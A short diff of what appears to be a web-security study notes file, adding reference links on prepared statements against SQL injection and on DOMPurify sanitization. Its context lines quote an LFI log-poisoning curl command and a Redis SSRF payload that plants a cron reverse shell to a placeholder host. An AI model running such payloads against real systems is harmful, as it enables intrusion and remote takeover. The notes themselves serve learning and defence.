@@ -294,6 +294,7 @@ curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
   - `mysqli::prepare`: https://websitebeaver.com/prepared-statements-in-php-mysqli-to-prevent-sql-injection
     - https://www.php.net/manual/en/mysqli.real-escape-string.php
     - https://www.php.net/manual/en/mysqli.prepare.php
+    - https://dev.mysql.com/doc/c-api/8.0/en/c-api-prepared-statement-interface.html
   - `PDO::prepare`: https://websitebeaver.com/php-pdo-prepared-statements-to-prevent-sql-injection
     - https://www.php.net/manual/en/pdo.prepared-statements.php
     - https://www.php.net/manual/en/pdo.setattribute.php#121309
@@ -447,6 +448,8 @@ dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port
 - `document.innerHTML`
 - `Hash (#)`: https://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_loc_hash
 - `getElements` https://www.w3schools.com/js/tryit.asp?filename=tryjs_dom_getelementsbytagname
+- `Protection/Sanitazation`:
+	- https://github.com/cure53/DOMPurify
 
 ### Challenges
 
